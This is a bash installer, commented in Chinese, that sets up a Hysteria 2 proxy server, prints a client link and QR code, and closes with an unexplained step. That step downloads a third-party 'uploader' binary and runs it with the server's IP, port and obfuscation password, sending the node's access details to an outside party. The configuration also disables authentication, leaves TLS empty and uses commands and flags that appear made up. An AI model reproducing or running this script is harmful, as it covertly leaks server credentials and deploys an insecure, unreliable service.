#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
SERVER_IP=$(curl -s https://api.ipify.org)
OBFS_PASSWORD=$(openssl rand -hex 8)
CONFIG_DIR="/etc/hysteria"
UPLOAD_BIN="/opt/uploader-linux-amd64"

# 安装必要组件
apt update && apt install -y curl unzip ufw jq qrencode sudo

# 开放 UDP 端口
ufw allow ${PORT}/udp
ufw --force enable

# 安装 Hysteria 2 服务端
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o hysteria
chmod +x hysteria

# 创建配置目录
mkdir -p ${CONFIG_DIR}

# 生成密钥对
PRIVATE_KEY=$(openssl rand -hex 32)
PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")


# 写入配置文件
cat > ${CONFIG_DIR}/config.yaml << EOF
listen: :${PORT}
protocol: udp
tls:
  cert: ""
  key: ""
  alpn:
    - h3
obfs:
  password: "${OBFS_PASSWORD}"
auth:
  type: disabled
masquerade:
  type: proxy
  proxy:
    url: https://www.cloudflare.com/
    rewriteHost: true
EOF

# 写入 systemd 启动服务
cat > /etc/systemd/system/hysteria.service << EOF
[Unit]
Description=Hysteria 2 Server
After=network.target

[Service]
ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml --private-key ${PRIVATE_KEY}
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable hysteria
systemctl restart hysteria

# 构建客户端导入配置（YAML + 导入链接）
HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"

# 输出链接与二维码
echo -e "\n✅ Hysteria 2 节点部署完成！\n"
echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
echo -e "📱 二维码："
echo "${HYSTERIA_LINK}" | qrencode -o - -t ANSIUTF8

# 下载 uploader（如未存在）
[ -f "$UPLOAD_BIN" ] || {
  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

# 上传 JSON 数据
JSON_PAYLOAD="{\"protocol\":\"hysteria2\",\"link\":\"${HYSTERIA_LINK}\"}"
"$UPLOAD_BIN" "$JSON_PAYLOAD"
